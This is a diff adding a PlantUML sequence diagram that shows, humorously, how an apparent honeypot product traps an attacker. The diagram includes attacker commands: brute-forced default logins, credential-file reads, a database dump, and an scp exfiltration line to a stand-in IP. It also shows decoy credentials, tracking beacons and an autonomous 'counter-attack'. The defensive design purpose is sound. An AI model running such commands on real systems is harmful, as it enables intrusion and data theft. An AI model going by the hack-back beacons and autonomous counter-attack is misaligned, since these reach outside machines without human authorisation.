@@ -1,0 +1,253 @@
+@startuml CerberusMesh - Malicious Actor Sequence: Fuck Around and Find Out
+!theme aws-orange
+title "CerberusMesh: A Malicious Actor's Journey from Confidence to Despair 😈"
+
+skinparam backgroundColor #F8F9FA
+skinparam sequenceMessageAlign center
+skinparam roundcorner 10
+
+actor "Bad Actor" as attacker #FF6B6B
+participant "Internet Scanner" as scanner #FF8E8E
+participant "SSH Honeypot" as honeypot #4ECDC4
+participant "AI Persona Engine" as ai_persona #96CEB4
+participant "Behavioral Analyzer" as analyzer #45B7D1
+participant "Cerberus Agent" as cerberus #FF9FF3
+participant "MITRE Mapper" as mitre #FECA57
+participant "ML Engine" as ml #8B5CF6
+participant "Threat Intel" as intel #5F27CD
+participant "Active Defense" as defense #E74C3C
+participant "SOC Team" as soc #2ECC71
+
+== Phase 1: Reconnaissance - "This looks easy..." ==
+
+note over attacker
+💭 "Time to find some easy targets.
+This server looks vulnerable!"
+end note
+
+attacker -> scanner : Launch automated reconnaissance
+activate scanner
+scanner -> honeypot : Port scan (22, 80, 443, 3389, 1433...)
+activate honeypot
+
+honeypot -> analyzer : 🚨 **FIRST CONTACT DETECTED**
+activate analyzer
+analyzer -> cerberus : Initialize threat profile
+activate cerberus
+
+note right of analyzer
+📊 Pattern Recognition:
+- Scan signature identified
+- Tool fingerprinting active
+- Behavioral baseline established
+end note
+
+honeypot --> scanner : Respond with "vulnerable" services
+scanner --> attacker : "Jackpot! Multiple open ports!"
+
+== Phase 2: Initial Access - "Getting in was too easy..." ==
+
+attacker -> honeypot : SSH brute force attack\n(admin:admin, root:password, etc.)
+honeypot -> ai_persona : Activate "panicked_admin" persona
+activate ai_persona
+
+honeypot -> analyzer : Log brute force patterns
+analyzer -> mitre : Map to T1110 (Brute Force)
+activate mitre
+mitre -> intel : Update attack timeline
+activate intel
+
+note right of mitre
+🎯 MITRE ATT&CK Mapping:
+- T1110: Brute Force
+- T1078: Valid Accounts
+- T1021.004: SSH
+- T1083: File Discovery
+end note
+
+honeypot --> attacker : **SUCCESS**: "root:password123"
+
+note over attacker
+😈 "Too easy! This admin is an idiot.
+Time to see what we have here..."
+end note
+
+== Phase 3: Exploration - The Trap Deepens ==
+
+attacker -> honeypot : "whoami && id && pwd"
+honeypot -> ai_persona : Trigger realistic responses
+
+ai_persona -> honeypot : Generate authentic terminal output
+note right of ai_persona
+🎭 AI Persona Response:
+"root
+uid=0(root) gid=0(root) groups=0(root)
+/root
+
+Oh no! Someone's in the system!"
+end note
+
+honeypot -> analyzer : Track command patterns
+analyzer -> ml : Feed behavioral data
+activate ml
+ml -> cerberus : Confidence score: 0.95 (definite attack)
+
+attacker -> honeypot : "ls -la /home /root /etc/passwd"
+honeypot -> ai_persona : Show tempting fake data
+
+ai_persona -> honeypot : Present "sensitive" files
+note left of honeypot
+📁 Decoy Files Presented:
+- /root/backups/database_passwords.txt
+- /home/admin/crypto_wallets/
+- /etc/shadow (fake but convincing)
+- /var/www/customer_data.sql
+end note
+
+== Phase 4: Lateral Movement - Deeper Into The Web ==
+
+attacker -> honeypot : "cat /root/backups/database_passwords.txt"
+honeypot -> ai_persona : Serve poisoned credentials
+
+ai_persona -> honeypot : Return fake DB credentials
+note right of ai_persona
+💀 Poisoned Data:
+mysql_user: admin_prod
+mysql_pass: SecureDB2024!
+postgres_user: dba_master  
+postgres_pass: P@ssw0rd!Enterprise
+
+🎣 Attribution Beacon Embedded
+end note
+
+honeypot -> analyzer : Log data access patterns
+analyzer -> mitre : Map to T1005 (Data from Local System)
+mitre -> intel : Escalate threat classification
+
+attacker -> honeypot : "mysql -u admin_prod -pSecureDB2024!"
+honeypot -> ai_persona : Simulate database access
+
+ai_persona -> honeypot : Present fake customer database
+note over ai_persona
+🍯 The Honey Gets Sweeter:
+- Fake customer records (10,000+)
+- Synthetic credit card data
+- Bogus financial information
+- Hidden tracking pixels
+end note
+
+== Phase 5: Data Exfiltration - The Point of No Return ==
+
+attacker -> honeypot : "mysqldump customer_db > /tmp/stolen_data.sql"
+honeypot -> cerberus : 🚨 **EXFILTRATION DETECTED**
+
+cerberus -> defense : **ACTIVATE COUNTERMEASURES**
+activate defense
+
+note right of cerberus
+🤖 Autonomous Decision:
+Threat Level: CRITICAL
+Confidence: 99.7%
+Action: FULL DEFENSIVE RESPONSE
+Attribution: PRIORITY
+end note
+
+defense -> honeypot : Deploy advanced tracking
+defense -> intel : Generate real-time IOCs
+defense -> soc : Alert security team
+activate soc
+
+attacker -> honeypot : "scp /tmp/stolen_data.sql user@203.0.113.45:/data/"
+honeypot -> defense : **CAPTURE EXFIL INFRASTRUCTURE**
+
+note right of defense
+🎯 Counter-Attack Initiated:
+- C2 server identified: 203.0.113.45
+- Attribution data collected
+- Network signatures generated
+- Law enforcement package prepared
+end note
+
+== Phase 6: The Tables Turn - "Wait, what's happening?" ==
+
+defense -> attacker : Beacon phones home with attribution data
+defense -> intel : Update threat actor profile
+
+note over intel
+📸 Full Attribution Package:
+- Source IP geolocation
+- Tool fingerprints captured
+- Attack infrastructure mapped
+- Behavioral patterns documented
+- Evidence chain established
+end note
+
+soc -> soc : Generate incident report
+soc -> defense : Coordinate response actions
+
+note right of soc
+👥 SOC Response:
+- Threat hunt initiated across network
+- IOCs pushed to security tools
+- Attribution shared with law enforcement
+- Customer notification prepared
+end note
+
+== Phase 7: Realization - "Oh fuck..." ==
+
+note over attacker
+😱 "Why are my tools not working?
+The data looks... weird?
+Are those honeypot logs in the files?!"
+end note
+
+attacker -> honeypot : "ps aux | grep honey"
+honeypot -> ai_persona : The jig is up response
+
+ai_persona -> honeypot : "System compromised! Honeypot detected!"
+note left of ai_persona
+🎭 Final Performance:
+"ALERT: Honeypot system detected!
+You've been monitored and recorded.
+All activities logged and reported.
+Have a nice day! 😊"
+end note
+
+== Phase 8: Aftermath - Game Over ==
+
+cerberus -> intel : Finalize threat profile
+intel -> defense : Deploy network-wide protections
+defense -> soc : Case closed with full attribution
+
+note over soc
+🏆 **MISSION ACCOMPLISHED**:
+✅ Attack fully documented
+✅ TTPs captured and analyzed  
+✅ Attribution evidence collected
+✅ Network defenses updated
+✅ Threat intelligence enriched
+✅ Zero actual damage sustained
+end note
+
+note over attacker #FF6B6B
+💀 **GAME OVER** 💀
+"I just spent 4 hours attacking
+a honeypot and gave them everything
+they needed to identify me and
+improve their defenses.
+
+I am not a smart criminal."
+end note
+
+deactivate scanner
+deactivate honeypot
+deactivate ai_persona
+deactivate analyzer
+deactivate cerberus
+deactivate mitre
+deactivate ml
+deactivate intel
+deactivate defense
+deactivate soc
+
+@enduml
